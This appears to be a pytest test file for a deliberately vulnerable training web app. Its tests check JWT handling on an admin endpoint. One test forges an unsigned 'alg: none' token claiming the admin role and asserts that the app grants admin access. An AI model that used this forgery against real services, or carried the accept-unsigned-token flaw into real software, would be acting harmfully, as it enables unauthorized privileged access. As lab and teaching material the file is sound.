def test_api_token_page_issues_a_guest_token(client):
    response = client.get("/a08/api-token")
    assert response.status_code == 200
    body = response.data.decode()
    # base64url of a JSON header always starts "eyJ" -- confirms a real
    # header.payload.signature token was rendered, not just any page text.
    assert "eyJ" in body
    assert body.count(".") >= 2


def test_admin_api_rejects_a_valid_guest_token(client):
    token_response = client.get("/a08/api-token")
    body = token_response.data.decode()
    start = body.index("eyJ")
    end = body.index("<", start)
    token = body[start:end].strip()

    response = client.post("/a08/admin-api", data={"token": token})
    assert response.status_code == 200
    assert b"Access denied" in response.data


def test_admin_api_accepts_a_forged_alg_none_token(client):
    import base64
    import json

    def b64url(data):
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    header = {"alg": "none", "typ": "JWT"}
    payload = {"user": "pwned-via-alg-none", "role": "admin"}
    header_seg = b64url(json.dumps(header).encode())
    payload_seg = b64url(json.dumps(payload).encode())
    forged_token = f"{header_seg}.{payload_seg}."

    response = client.post("/a08/admin-api", data={"token": forged_token})
    assert response.status_code == 200
    assert b"ADMIN ACCESS GRANTED -- welcome, pwned-via-alg-none" in response.data


def test_admin_api_rejects_a_tampered_hs256_token(client):
    import base64
    import json

    def b64url(data):
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"user": "attacker", "role": "admin"}
    header_seg = b64url(json.dumps(header).encode())
    payload_seg = b64url(json.dumps(payload).encode())
    tampered_token = f"{header_seg}.{payload_seg}.not-a-real-signature"

    response = client.post("/a08/admin-api", data={"token": tampered_token})
    assert response.status_code == 200
    assert b"Invalid token" in response.data


def test_jwt_alg_none_bypass_link_appears_in_overview_once_registered(client):
    response = client.get("/a08/")
    assert response.status_code == 200
    assert b"JWT alg:none Signature Bypass" in response.data
    assert b'href="/a08/admin-api"' in response.data
